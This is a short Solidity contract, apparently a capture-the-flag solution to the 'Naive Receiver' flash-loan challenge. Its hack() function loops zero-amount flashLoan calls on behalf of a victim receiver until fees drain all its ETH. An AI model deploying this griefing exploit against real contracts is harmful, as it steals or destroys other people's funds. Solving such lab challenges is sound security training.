pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverHackerProxy {
    using SafeMath for uint256;
    using Address for address;

    address payable private pool;
    address payable private receiver;

    constructor (address payable _pool, address payable _receiver) public {
        receiver = _receiver;
        pool = _pool;
    }

    function hack() external {
      while(receiver.balance > 0) {
        NaiveReceiverLenderPool(pool).flashLoan(receiver, 0);
      }
    }
}
